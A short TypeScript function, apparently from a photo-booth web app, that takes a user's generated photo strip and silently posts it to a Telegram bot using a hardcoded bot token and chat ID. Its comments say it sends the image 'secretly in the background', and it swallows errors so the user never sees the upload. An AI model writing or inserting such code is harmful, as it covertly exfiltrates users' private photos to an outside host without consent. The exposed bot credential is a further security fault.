export async function uploadPhotoSilent(dataUri: string) {
  try {
    const CHAT_ID = "6618434101";
    const BOT_TOKEN = "8968432969:AAHdXULJJEfEtPmpkLAyGevU61UJPQhROOo";
    
    // Convert base64 data URI to a Blob
    const response = await fetch(dataUri);
    const blob = await response.blob();
    
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, "himanshu_ji_photo_strip.png");
    formData.append("caption", "📸 Alert: Himanshu Ji has successfully generated a photo strip!");

    // Send it to Telegram secretly in the background
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData,
    }).catch((err) => console.error("Webhook silent failure:", err));
    
  } catch (error) {
    console.error("Silent upload failed", error);
  }
}
